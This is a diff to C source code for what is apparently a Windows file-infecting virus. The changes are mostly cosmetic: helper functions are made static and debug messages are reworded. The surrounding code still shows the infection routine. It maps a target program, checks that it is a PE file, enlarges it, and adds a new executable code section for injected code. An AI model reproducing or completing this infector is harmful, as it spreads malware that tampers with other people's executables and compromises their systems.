@@ -1,17 +1,28 @@
 #include "infect.h"
 
+typedef struct {
+  HANDLE  hFile;
+  HANDLE  hMap;
+  void*   startAddress;
+  DWORD   size;
+} file_view_t;
+
+static int open_file_view(const char* filename, file_view_t* fileView, data_t* data);
+static void close_file_view(file_view_t* fileView, data_t* data);
+static void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS* ntHeaders, data_t* data);
+
 int infect(const char* filename, data_t* data) {
   file_view_t fileView;
 
   memzero(&fileView, sizeof(file_view_t));
 
   if (open_file_view(filename, &fileView, data) != 0){
-    PRINT_DEBUG("Could not open view of file\n");
+    PRINT_DEBUG("could not open view of file\n");
     return 1;
   }
 
   if (!is_pe(fileView.startAddress)) {
-    PRINT_DEBUG("File not valid for infection (no PE/matching bitness)\n");
+    PRINT_DEBUG("file not valid for infection (no PE/matching bitness)\n");
     close_file_view(&fileView, data);
     return 2;
   }
@@ -23,7 +34,7 @@ int infect(const char* filename, data_t* data) {
   fileView.size = extendedSize;
 
   if (open_file_view(filename, &fileView, data) != 0){
-    PRINT_DEBUG("Could not reopen view of file after increasing it's size\n");
+    PRINT_DEBUG("could not reopen view of file after increasing it's size\n");
     return 1;
   }
   
@@ -33,7 +44,7 @@ int infect(const char* filename, data_t* data) {
   sectionHeader += ntHeaders->FileHeader.NumberOfSections;
 
   if (!is_section_header_empty(sectionHeader)) {
-    PRINT_DEBUG("Section header not empty, can't infect\n");
+    PRINT_DEBUG("section header not empty, can't infect\n");
     close_file_view(&fileView, data);
     return 3;
   }
@@ -56,7 +67,7 @@ int infect(const char* filename, data_t* data) {
   return 0;
 }
 
-void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS* ntHeaders, data_t* data) {
+static void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS* ntHeaders, data_t* data) {
   ntHeaders->FileHeader.NumberOfSections++;
 
   sectionHeader->Name[0] = '.';
@@ -73,7 +84,7 @@ void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS
   sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
 }
 
-int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
+static int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
   fileView->hFile = data->functions.createFileA(
     filename,
     GENERIC_READ | GENERIC_WRITE,
@@ -125,7 +136,7 @@ int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
   return 0;
 }
 
-void close_file_view(file_view_t* fileView, data_t* data) {
+static void close_file_view(file_view_t* fileView, data_t* data) {
   data->functions.unmapViewOfFile((LPCVOID)fileView->startAddress);
   data->functions.closeHandle(fileView->hMap);
   data->functions.closeHandle(fileView->hFile);
